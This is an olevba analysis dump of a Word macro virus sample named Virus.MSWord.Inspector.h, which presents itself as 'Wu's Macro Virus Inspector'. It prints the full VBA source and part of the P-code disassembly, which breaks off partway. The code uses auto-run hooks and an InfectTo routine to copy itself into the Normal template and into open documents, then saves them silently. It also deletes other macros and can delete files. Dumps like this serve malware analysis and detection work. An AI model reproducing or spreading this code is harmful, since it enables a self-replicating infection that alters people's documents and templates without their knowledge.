olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Inspector.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Inspector.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VirusInspect.bas 
in file: ./Virus.MSWord.Inspector.h - OLE stream: 'Macros/VBA/VirusInspect'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Inspector Version 8.2
Option Explicit


Dim KillCount As Integer
Dim sAutoNames  As Variant

Dim bInited As Boolean
Dim LatestVer As Double
Dim g_VBCom As Variant
Dim DetectedList As New Collection
Const Logo As String = "Wu's Macro Virus Inspector "



Function Detected(doc As Variant) As Integer
Dim i As Integer
For i = 1 To DetectedList.count
  If (doc.Name = DetectedList.Item(i)) Then
    Detected = i
    Exit Function
  End If
Next
    Detected = 0
End Function
Sub SetDetectedFlag(doc As Variant, ByVal f As Boolean)
Dim i As Integer
i = Detected(doc)
If (f) Then
    If (i < 1) Then
        DetectedList.Add (doc.Name)
    End If
Else
    If (i > 0) Then
        DetectedList.Remove (i)
    End If
End If
End Sub
Sub ClearReg()
While DetectedList.count > 0
    DetectedList.Remove (1)
Wend
End Sub



Sub DeleteCode(cm As Variant, ByVal st, n As Long)
KillCount = KillCount + 1
Call cm.DeleteLines(st, n)
ShowStatus ("Delete From Line " & st & "to " & st + n)
End Sub
Sub KillSub(cm As Variant, ByVal Name As String)
Dim i, n As Long
'Dim cmd As CodeModule

  If (Not cm.Find(Name, 1, 1, cm.CountOfLines + 1, 1)) Then
   Exit Sub
  End If
  On Error GoTo Err
   i = cm.ProcStartLine(Name, 0) 'vbext_pk_Proc)
   n = cm.ProcCountLines(Name, 0) ' vbext_pk_Proc)
    If (InStr(1, cm.Lines(i, 1), "Wu", vbTextCompare) < 1) Then
     Call DeleteCode(cm, i, n)
    End If
    Exit Sub
Err:
End Sub
Sub KillAutoMod(md As Variant)
Dim Name As Variant
        For Each Name In sAutoNames
               If (InStr(1, md.Name, Name, vbTextCompare) > 0) Then
                        Call KillSub(md, "MAIN")
               End If
        Next Name
 
End Sub

Sub KillVirus(doc As Variant) 'Document)
'VBProject
Dim prj As Variant 'VBProject
Dim obj As Variant
Dim Name As Variant
Dim j, n As Integer
Dim md As Variant 'CodeModule
Dim VBCom As Variant 'VBComponents
Dim count As Integer
Dim saved As Boolean

Call Init
If (Detected(doc)) Then
     Exit Sub
End If

 saved = doc.saved
 
    count = KillCount
    Set prj = doc.VBProject
    Set VBCom = prj.VBComponents
    For j = 1 To VBCom.count
     Set md = VBCom.Item(j).CodeModule
        Call KillAutoMod(md)
    Next j
    For j = 1 To VBCom.count
    Set md = VBCom.Item(j).CodeModule
        ShowStatus "Scanning In " & md.Name
        For Each Name In sAutoNames
         Call KillSub(md, Name)
        Next Name
        Call KillAutoMod(md)
    Next j
    
    Call SetDetectedFlag(doc, True)
'    prj.VBComponents(1).Activate
    If (KillCount > count) Then
        ClearReg
        If (saved) Then
            Call SafeSave(doc)
        Else
         doc.saved = False
        End If
    Else
     If (saved) Then
     doc.saved = True
     End If
    End If
 
 End Sub
 
 
 
 
 
Sub DetectAll()

Dim doc As Variant 'Document
For Each doc In Documents
 Call KillVirus(doc)
Next
For Each doc In Templates
 Call KillVirus(doc)
Next
If (KillCount > 0) Then
    ShowStatus "ﾉｱｵ・" & KillCount & "ｸ｡ｶｾ｣｡ｵｫﾎｴｱ｣ｴ・"
Else
    ShowStatus "ﾎｴｷ｢ﾏﾖｺ・｡ｶｾ｣｡"
End If
KillCount = 0
End Sub

 
 
 
  
 
Sub Init()
    Dim i As Integer
    Dim obj As Variant
    
    If (bInited) Then
        Exit Sub
    End If
    'MsgBox "Init"
    sAutoNames = Array("Document_Close", "Document_Open", _
    "AutoClose", "AutoOpen", "Document_New", "AutoExec", _
     "AutoNew", "AutoExit")
    Call SetAttr(Application.NormalTemplate.FullName, 32) 'vbArchive)
    Set obj = Application.NormalTemplate
    Call InfectTo(obj)
    KillCount = 0
    ClearReg
    bInited = True
End Sub
Sub AutoExec() 'Wu's Sub
 Call DetectAll
End Sub
Sub AutoExit() 'Wu's Sub
 Call DetectAll
End Sub
Sub AutoOpen() 'Wu's Sub
 Call DetectAll
End Sub
Sub AutoNew() 'Wu's Sub
 Call DetectAll
End Sub

Sub FileOpen() 'Wu's Sub
Dim doc As Document
With Dialogs(wdDialogFileOpen)
   If (.Show = -1) Then
    Call SetDetectedFlag(ActiveDocument.VBProject, False)
    Call DetectAll
   End If
End With
End Sub
Sub DocClose()
On Error GoTo normal
Call InfectTo(ActiveDocument)
normal:
On Error GoTo Skip
ActiveDocument.Close
Skip:
End Sub

Function MsgMode(s As Variant) As Integer
 MsgMode = msoBalloonButtonYes
End Function
Sub ShowStatus(ByVal s As String)
StatusBar = s
End Sub

Sub MsgModeLess(ByVal s As String, Optional ByVal ForceShow As Boolean = False)
    ShowStatus s
End Sub
Sub CopyTo(doc As Variant, NewName As String)
Dim NewDoc As Document
    doc.Activate
    Selection.WholeStory
    Selection.Copy
    Set NewDoc = Documents.Add
    NewDoc.Activate
    Selection.Paste
    doc.Close SaveChanges:=False
    On Error GoTo prompt
    NewDoc.SaveAs (NewName)
    Exit Sub
prompt:
    With Dialogs(wdDialogFileSaveAs)
    .Name = NewName
    .fileformat = wdFormatDocument
    .Show
    End With
End Sub
Sub KillFile(Path As String)
Dim r As Integer
    r = MsgBox("ﾊﾇｷｫｴｾﾎﾄｼ" & Path & " ﾉｾｳ｣ｿ", vbYesNoCancel, Logo)
    If (r = vbCancel) Then
     End
    Else
     If (r = vbNo) Then
        Exit Sub
     End If
    End If
    On Error GoTo Err
    Kill (Path)
    Call ShowStatus(Path & "Killed!")
    Exit Sub
Err:
    Call ShowStatus("Can not kill file " & Path)

End Sub
Sub SafeSave(doc As Variant)
'
'Dim doc As Document
Dim NewName As String
Dim r As Integer
Dim Path As String
Dim NewDoc As Document
Dim TempName As String
Dim Format As Integer


   NewName = doc.FullName
   On Error GoTo nextline
   Call SetAttr(doc.FullName, vbArchive)
nextline:
   On Error GoTo IsTemp
    Format = doc.SaveFormat
   If (Format = 1) Then
    GoTo IsTemp
   Else
    On Error GoTo ErrSave
    doc.SaveAs (NewName)
   End If
   Exit Sub
IsTemp:
   ' TempName = " c:\~XXXX1234567ToBeDelted" & "TMP.dot"
'    MsgBox "open temp"
  '  doc.SaveAs FileName:=TempName, fileformat:=1
  '  doc.Close
 '   Kill TempName
 '   On Error GoTo NewDocErr
'    Set doc = Documents.Add(Template:=TempName)
   ' doc.SaveAs FileName:=NewName
Exit Sub
NewDocErr:
ErrSave:

   MsgBox "ﾊｧｰﾜ｣｡"
   
End Sub


Function GetVer(prj As Variant) As Double
'Dim pprj As Variant 'VBProject
Dim VBCom As Variant 'VBComponent
Dim VerStr As String
Dim i As Integer
Const Tag As String = "Version"
GetVer = 0#
Set g_VBCom = Nothing
For Each VBCom In prj.VBComponents
   If (VBCom.CodeModule.Find(Logo, 1, 1, VBCom.CodeModule.CountOfLines + 1, 1)) Then
            Set g_VBCom = VBCom
            GetVer = 0.1
            On Error GoTo NoVer
            VerStr = VBCom.CodeModule.Lines(1, 1)
            i = InStr(1, VerStr, Tag, vbTextCompare)
            If (i > 0) Then
                GetVer = Val(Right(VerStr, Len(VerStr) - i - Len(Tag)))
            End If
NoVer:
            Exit Function
   End If
Next VBCom
End Function
Function GetLatest() As Variant
Dim prj As Variant 'VBProject
Dim Ver As Double
Set GetLatest = Nothing
LatestVer = 0
For Each prj In ThisDocument.Application.VBE.VBProjects
  Ver = GetVer(prj)
  If (Ver > LatestVer) Then
     LatestVer = Ver
     Set GetLatest = g_VBCom
  End If
Next prj
End Function
Sub setup()
   Call InfectTo(ThisDocument.Application.NormalTemplate)
   MsgBox "Installed " & Logo
   
  End Sub
  
 Function FoundMod(doc As Variant, ByVal s As String) As Variant
 Dim VBCom As Variant 'VBComponent
 For Each VBCom In doc.VBProject.VBComponents
  If (VBCom.Name = s) Then
  Set FoundMod = VBCom
  Exit Function
  End If
 Next
 Set FoundMod = Nothing
 End Function
 
Sub InfectTo(doc As Variant)
Dim prj As Variant 'VBProject
Dim VBCom, ObjCom As Variant 'VBComponent
Dim r As Double
Dim saved As Boolean


Const modname As String = "VirusInspect"
    
  saved = doc.saved
Set VBCom = GetLatest
r = GetVer(doc.VBProject)
Select Case (r)
 Case Is >= LatestVer: Exit Sub
 Case Else
        If (r > 0) Then
        Call ShowStatus("Upgraded｣｡" & Logo)
        Else
        Call ShowStatus("Installed｣｡" & Logo)
        End If
        Beep
        Beep
        Beep

 End Select
            
        Set ObjCom = FoundMod(doc, modname)
        If (ObjCom Is Nothing) Then
        Set ObjCom = doc.VBProject.VBComponents.Add(1) 'vbext_ct_StdModule  )
        ObjCom.Name = modname
        End If
        Call ObjCom.CodeModule.DeleteLines(1, ObjCom.CodeModule.CountOfLines)
        Call ObjCom.CodeModule.InsertLines(1, VBCom.CodeModule.Lines(1, VBCom.CodeModule.CountOfLines + 1))
 If (saved) Then
On Error Resume Next
 Call doc.SaveAs(doc.FullName)
 End If
 
End Sub








































































































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Inspector.h
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/VirusInspect - 19431 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0016 " Inspector Version 8.2"
' Line #1:
' 	Option  (Explicit)
' Line #2:
' Line #3:
' Line #4:
' 	Dim 
' 	VarDefn KillCount (As Integer)
' Line #5:
' 	Dim 
' 	VarDefn sAutoNames (As Variant) 0x0010
' Line #6:
' Line #7:
' 	Dim 
' 	VarDefn bInited (As Boolean)
' Line #8:
' 	Dim 
' 	VarDefn LatestVer (As Double)
' Line #9:
' 	Dim 
' 	VarDefn g_VBCom (As Variant)
' Line #10:
' 	Dim 
' 	VarDefn DetectedList (New )
' Line #11:
' 	Dim (Const) 
' 	LitStr 0x001B "Wu's Macro Virus Inspector "
' 	VarDefn Logo (As String)
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' 	FuncDefn (Function Detected(doc As Variant) As Integer)
' Line #16:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DetectedList 
' 	MemLd count 
' 	For 
' Line #18:
' 	Ld doc 
' 	MemLd New 
' 	Ld i 
' 	Ld DetectedList 
' 	ArgsMemLd Item 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #19:
' 	Ld i 
' 	St Detected 
' Line #20:
' 	ExitFunc 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	StartForVariable 
' 	Next 
' Line #23:
' 	LitDI2 0x0000 
' 	St Detected 
' Line #24:
' 	EndFunc 
' Line #25:
' 	FuncDefn (Sub SetDetectedFlag(doc As Variant, ByVal False As Boolean))
' Line #26:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #27:
' 	Ld doc 
' 	ArgsLd Detected 0x0001 
' 	St i 
' Line #28:
' 	Ld False 
' 	Paren 
' 	IfBlock 
' Line #29:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #30:
' 	Ld doc 
' 	MemLd New 
' 	Paren 
' 	Ld DetectedList 
' 	ArgsMemCall Add 0x0001 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	ElseBlock 
' Line #33:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #34:
' 	Ld i 
' 	Paren 
' 	Ld DetectedList 
' 	ArgsMemCall Remove 0x0001 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Sub ClearReg())
' Line #39:
' 	Ld DetectedList 
' 	MemLd count 
' 	LitDI2 0x0000 
' 	Gt 
' 	While 
' Line #40:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld DetectedList 
' 	ArgsMemCall Remove 0x0001 
' Line #41:
' 	Wend 
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' 	FuncDefn (Sub DeleteCode(cm As Variant, ByVal st, n As Long))
' Line #47:
' 	Ld KillCount 
' 	LitDI2 0x0001 
' 	Add 
' 	St KillCount 
' Line #48:
' 	Ld st 
' 	Ld n 
' 	Ld cm 
' 	ArgsMemCall (Call) DeleteLines 0x0002 
' Line #49:
' 	LitStr 0x0011 "Delete From Line "
' 	Ld st 
' 	Concat 
' 	LitStr 0x0003 "to "
' 	Concat 
' 	Ld st 
' 	Ld n 
' 	Add 
' 	Concat 
' 	Paren 
' 	ArgsCall ShowStatus 0x0001 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub KillSub(cm As Variant, ByVal New As String))
' Line #52:
' 	Dim 
' 	VarDefn i
' 	VarDefn n (As Long)
' Line #53:
' 	QuoteRem 0x0000 0x0015 "Dim cmd As CodeModule"
' Line #54:
' Line #55:
' 	Ld New 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld cm 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld cm 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #56:
' 	ExitSub 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	OnError Err 
' Line #59:
' 	Ld New 
' 	LitDI2 0x0000 
' 	Ld cm 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	St i 
' 	QuoteRem 0x0021 0x000E "vbext_pk_Proc)"
' Line #60:
' 	Ld New 
' 	LitDI2 0x0000 
' 	Ld cm 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St n 
' 	QuoteRem 0x0022 0x000F " vbext_pk_Proc)"
' Line #61:
' 	LitDI2 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld cm 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0002 "Wu"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0001 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #62:
' 	Ld cm 
' 	Ld i 
' 	Ld n 
' 	ArgsCall (Call) DeleteCode 0x0003 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	ExitSub 
' Line #65:
' 	Label Err 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub KillAutoMod(md As Variant))
' Line #68:
' 	Dim 
' 	VarDefn New (As Variant)
' Line #69:
' 	StartForVariable 
' 	Ld New 
' 	EndForVariable 
' 	Ld sAutoNames 
' 	ForEach 
' Line #70:
' 	LitDI2 0x0001 
' 	Ld md 
' 	MemLd New 
' 	Ld New 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #71:
' 	Ld md 
' 	LitStr 0x0004 "MAIN"
' 	ArgsCall (Call) KillSub 0x0002 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	StartForVariable 
' 	Ld New 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' Line #75:
' 	EndSub 
' Line #76:
' Line #77:
' 	FuncDefn (Sub KillVirus(doc As Variant))
' 	QuoteRem 0x001E 0x0009 "Document)"
' Line #78:
' 	QuoteRem 0x0000 0x0009 "VBProject"
' Line #79:
' 	Dim 
' 	VarDefn prj (As Variant)
' 	QuoteRem 0x0013 0x0009 "VBProject"
' Line #80:
' 	Dim 
' 	VarDefn obj (As Variant)
' Line #81:
' 	Dim 
' 	VarDefn New (As Variant)
' Line #82:
' 	Dim 
' 	VarDefn j
' 	VarDefn n (As Integer)
' Line #83:
' 	Dim 
' 	VarDefn md (As Variant)
' 	QuoteRem 0x0012 0x000A "CodeModule"
' Line #84:
' 	Dim 
' 	VarDefn VBCom (As Variant)
' 	QuoteRem 0x0015 0x000C "VBComponents"
' Line #85:
' 	Dim 
' 	VarDefn count (As Integer)
' Line #86:
' 	Dim 
' 	VarDefn saved (As Boolean)
' Line #87:
' Line #88:
' 	ArgsCall (Call) Init 0x0000 
' Line #89:
' 	Ld doc 
' 	ArgsLd Detected 0x0001 
' 	Paren 
' 	IfBlock 
' Line #90:
' 	ExitSub 
' Line #91:
' 	EndIfBlock 
' Line #92:
' Line #93:
' 	Ld doc 
' 	MemLd saved 
' 	St saved 
' Line #94:
' Line #95:
' 	Ld KillCount 
' 	St count 
' Line #96:
' 	SetStmt 
' 	Ld doc 
' 	MemLd VBProject 
' 	Set prj 
' Line #97:
' 	SetStmt 
' 	Ld prj 
' 	MemLd VBComponents 
' 	Set VBCom 
' Line #98:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd count 
' 	For 
' Line #99:
' 	SetStmt 
' 	Ld j 
' 	Ld VBCom 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set md 
' Line #100:
' 	Ld md 
' 	ArgsCall (Call) KillAutoMod 0x0001 
' Line #101:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #102:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd count 
' 	For 
' Line #103:
' 	SetStmt 
' 	Ld j 
' 	Ld VBCom 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set md 
' Line #104:
' 	LitStr 0x000C "Scanning In "
' 	Ld md 
' 	MemLd New 
' 	Concat 
' 	ArgsCall ShowStatus 0x0001 
' Line #105:
' 	StartForVariable 
' 	Ld New 
' 	EndForVariable 
' 	Ld sAutoNames 
' 	ForEach 
' Line #106:
' 	Ld md 
' 	Ld New 
' 	ArgsCall (Call) KillSub 0x0002 
' Line #107:
' 	StartForVariable 
' 	Ld New 
' 	EndForVariable 
' 	NextVar 
' Line #108:
' 	Ld md 
' 	ArgsCall (Call) KillAutoMod 0x0001 
' Line #109:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #110:
' Line #111:
' 	Ld doc 
' 	LitVarSpecial (True)
' 	ArgsCall (Call) SetDetectedFlag 0x0002 
' Line #112:
' 	QuoteRem 0x0000 0x0020 "    prj.VBComponents(1).Activate"
' Line #113:
' 	Ld KillCount 
' 	Ld count 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #114:
' 	ArgsCall ClearReg 0x0000 
' Line #115:
' 	Ld saved 
' 	Paren 
' 	IfBlock 
' Line #116:
' 	Ld doc 
' 	ArgsCall (Call) SafeSave 0x0001 
' Line #117:
' 	ElseBlock 
' Line #118:
' 	LitVarSpecial (False)
' 	Ld doc 
' 	MemSt saved 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	ElseBlock 
' Line #121:
' 	Ld saved 
' 	Paren 
' 	IfBlock 
' Line #122:
' 	LitVarSpecial (True)
' 	Ld doc 
' 	MemSt saved 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	EndIfBlock 
' Line #125:
' Line #126:
' 	EndSub 
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' 	FuncDefn (Sub DetectAll())
' Line #133:
' Line #134:
' 	Dim 
' 	VarDefn doc (As Variant)
' 	QuoteRem 0x0013 0x0008 "Document"
' Line #135:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #136:
' 	Ld doc 
' 	ArgsCall (Call) KillVirus 0x0001 
' Line #137:
' 	StartForVariable 
' 	Next 
' Line #138:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #139:
' 	Ld doc 
' 	ArgsCall (Call) KillVirus 0x0001 
' Line #140:
' 	StartForVariable 
' 	Next 
' Line #141:
' 	Ld KillCount 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #142:
' 	LitStr 0x0005 "ﾉｱｵ・"
' 	Ld KillCount 
' 	Concat 
' 	LitStr 0x0011 "ｸ｡ｶｾ｣｡ｵｫﾎｴｱ｣ｴ・"
' 	Concat 
' 	ArgsCall ShowStatus 0x0001 
' Line #143:
' 	ElseBlock 
' Line #144:
' 	LitStr 0x000E "ﾎｴｷ｢ﾏﾖｺ・｡ｶｾ｣｡"
' 	ArgsCall ShowStatus 0x0001 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	LitDI2 0x0000 
' 	St KillCount 
' Line #147:
' 	EndSub 
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' 	FuncDefn (Sub Init())
' Line #155:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #156:
' 	Dim 
' 	VarDefn obj (As Variant)
' Line #157:
' Line #158:
' 	Ld bInited 
' 	Paren 
' 	IfBlock 
' Line #159:
' 	ExitSub 
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	QuoteRem 0x0004 0x000D "MsgBox "Init""
' Line #162:
' 	LineCont 0x0008 08 00 04 00 10 00 05 00
' 	LitStr 0x000E "Document_Close"
' 	LitStr 0x000D "Document_Open"
' 	LitStr 0x0009 "AutoClose"
' 	LitStr 0x0008 "AutoOpen"
' 	LitStr 0x000C "Document_New"
' 	LitStr 0x0008 "AutoExec"
' 	LitStr 0x0007 "AutoNew"
' 	LitStr 0x0008 "AutoExit"
' 	ArgsArray Array 0x0008 
' 	St sAutoNames 
' Line #163:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd FullName 
' 	LitDI2 0x0020 
' 	ArgsCall (Call) SetAttr 0x0002 
' 	QuoteRem 0x003A 0x000A "vbArchive)"
' Line #164:
' 	SetStmt 
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	Set obj 
' Line #165:
' 	Ld obj 
' 	ArgsCall (Call) InfectTo 0x0001 
' Line #166:
' 	LitDI2 0x0000 
' 	St KillCount 
' Line #167:
' 	ArgsCall ClearReg 0x0000 
' Line #168:
' 	LitVarSpecial (True)
' 	St bInited 
' Line #169:
' 	EndSub 
' Line #170:
' 	FuncDefn (Sub AutoExec())
' 	QuoteRem 0x000F 0x0008 "Wu's Sub"
' Line #171:
' 	ArgsCall (Call) DetectAll 0x0000 
' Line #172:
' 	EndSub 
' Line #173:
' 	FuncDefn (Sub AutoExit())
' 	QuoteRem 0x000F 0x0008 "Wu's Sub"
' Line #174:
' 	ArgsCall (Call) DetectAll 0x0000 
' Line #175:
' 	EndSub 
' Line #176:
' 	FuncDefn (Sub AutoOpen())
' 	QuoteRem 0x000F 0x0008 "Wu's Sub"
' Line #177:
' 	ArgsCall (Call) DetectAll 0x0000 
' Line #178:
' 	EndSub 
' Line #179:
' 	FuncDefn (Sub AutoNew())
' 	QuoteRem 0x000E 0x0008 "Wu's Sub"
' Line #180:
' 	ArgsCall (Call) DetectAll 0x0000 
' Line #181:
' 	EndSub 
' Line #182:
' Line #183:
' 	FuncDefn (Sub FileOpen())
' 	QuoteRem 0x000F 0x0008 "Wu's Sub"
' Line #184:
' 	Dim 
' 	VarDefn doc (As Document)
' Line #185:
' 	StartWithExpr 
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #186:
' 	MemLdWith Show 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #187:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	LitVarSpecial (False)
' 	ArgsCall (Call) SetDetectedFlag 0x0002 
' Line #188:
' 	ArgsCall (Call) DetectAll 0x0000 
' Line #189:
' 	EndIfBlock 
' Line #190:
' 	EndWith 
' Line #191:
' 	EndSub 
' Line #192:
' 	FuncDefn (Sub DocClose())
' Line #193:
' 	OnError normal 
' Line #194:
' 	Ld ActiveDocument 
' 	ArgsCall (Call) InfectTo 0x0001 
' Line #195:
' 	Label normal 
' Line #196:
' 	OnError Skip 
' Line #197:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #198:
' 	Label Skip 
' Line #199:
' 	EndSub 
' Line #200:
' Line #201:
' 	FuncDefn (Function MsgMode(s As Variant) As Integer)
' Line #202:
' 	Ld msoBalloonButtonYes 
' 	St MsgMode 
' Line #203:
' 	EndFunc 
' Line #204:
' 	FuncDefn (Sub ShowStatus(ByVal s As String))
' Line #205:
' 	Ld s 
' 	St StatusBar 
' Line #206:
' 	EndSub 
' Line #207:
' Line #208:
' 	ConstFuncExpr 
' 	LitVarSpecial (False)
' 	FuncDefn (Sub MsgModeLess(ByVal s As String, Optional ByVal ForceShow As Boolean))
' Line #209:
' 	Ld s 
' 	ArgsCall ShowStatus 0x0001 
' Line #210:
' 	EndSub 
' Line #211:
' 	FuncDefn (Sub CopyTo(doc As Variant, NewName As String))
' Line #212:
' 	Dim 
' 	VarDefn NewDoc (As Document)
' Line #213:
' 	Ld doc 
' 	ArgsMemCall Activate 0x0000 
' Line #214:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #215:
' 	Ld Selection 
' 	ArgsMemCall Copy 0x0000 
' Line #216:
' 	SetStmt 
' 	Ld Documents 
' 	MemLd Add 
' 	Set NewDoc 
' Line #217:
' 	Ld NewDoc 
' 	ArgsMemCall Activate 0x0000 
' Line #218:
' 	Ld Selection 
' 	ArgsMemCall Paste 0x0000 
' Line #219:
' 	LitVarSpecial (False)
' 	ParamNamed SaveChanges 
' 	Ld doc 
' 	ArgsMemCall Close 0x0001 
' Line #220:
' 	OnError prompt 
' Line #221:
' 	Ld NewName 
' 	Paren 
' 	Ld NewDoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #222:
' 	ExitSub 
' Line #223:
' 	Label prompt 
' Line #224:
' 	StartWithExpr 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #225:
' 	Ld NewName 
' 	MemStWith New 
' Line #226:
' 	Ld wdFormatDocument 
' 	MemStWith fileformat 
' Line #227:
' 	ArgsMemCallWith Show 0x0000 
' Line #228:
' 	EndWith 
' Line #229:
' 	EndSub 
' Line #230:
' 	FuncDefn (Sub KillFile(Path As String))
' Line #231:
' 	Dim 
' 	VarDefn r (As Integer)
' Line #232:
' 	LitStr 0x000E "ﾊﾇｷｫｴｾﾎﾄｼ"
' 	Ld Path 
' 	Concat 
' 	LitStr 0x0007 " ﾉｾｳ｣ｿ"
' 	Concat 
' 	Ld vbYesNoCancel 
' 	Ld Logo 
' 	ArgsLd MsgBox 0x0003 
' 	St r 
' Line #233:
' 	Ld r 
' 	Ld vbCancel 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #234:
' 	End 
' Line #235:
' 	ElseBlock 
' Line #236:
' 	Ld r 
' 	Ld vbNo 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #237:
' 	ExitSub 
' Line #238:
' 	EndIfBlock 
' Line #239:
' 	EndIfBlock 
' Line #240:
' 	OnError Err 
' Line #241:
' 	Ld Path 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #242:
' 	Ld Path 
' 	LitStr 0x0007 "Killed!"
' 	Concat 
' 	ArgsCall (Call) ShowStatus 0x0001 
' Line #243:
' 	ExitSub 
' Line #244:
' 	Label Err 
' Line #245:
' 	LitStr 0x0012 "Can not kill file "
' 	Ld Path 
' 	Concat 
' 	ArgsCall (Call) ShowStatus 0x0001 
' Line #246:
' Line #247:
' 	EndSub 
' Line #248:
' 	FuncDefn (Sub SafeSave(doc As Variant))
' Line #249:
' 	QuoteRem 0x0000 0x0000 ""
' Line #250:
' 	QuoteRem 0x0000 0x0013 "Dim doc As Document"
' Line #251:
' 	Dim 
' 	VarDefn NewName (As String)
' Line #252:
' 	Dim 
' 	VarDefn r (As Integer)
' Line #253:
' 	Dim 
' 	VarDefn Path (As String)
' Line #254:
' 	Dim 
' 	VarDefn NewDoc (As Document)
' Line #255:
' 	Dim 
' 	VarDefn TempName (As String)
' Line #256:
' 	Dim 
' 	VarDefn Format$ (As Integer)
' Line #257:
' Line #258:
' Line #259:
' 	Ld doc 
' 	MemLd FullName 
' 	St NewName 
' Line #260:
' 	OnError nextline 
' Line #261:
' 	Ld doc 
' 	MemLd FullName 
' 	Ld vbArchive 
' 	ArgsCall (Call) SetAttr 0x0002 
' Line #262:
' 	Label nextline 
' Line #263:
' 	OnError IsTemp 
' Line #264:
' 	Ld doc 
' 	MemLd SaveFormat 
' 	St Format$ 
' Line #265:
' 	Ld Format$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #266:
' 	GoTo IsTemp 
' Line #267:
' 	ElseBlock 
' Line #268:
' 	OnError ErrSave 
' Line #269:
' 	Ld NewName 
' 	Paren 
' 	Ld doc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #270:
' 	EndIfBlock 
' Line #271:
' 	ExitSub 
' Line #272:
' 	Label IsTemp 
' Line #273:
' 	QuoteRem 0x0003 0x0034 " TempName = " c:\~XXXX1234567ToBeDelted" & "TMP.dot""
' Line #274:
' 	QuoteRem 0x0000 0x0016 "    MsgBox "open temp""
' Line #275:
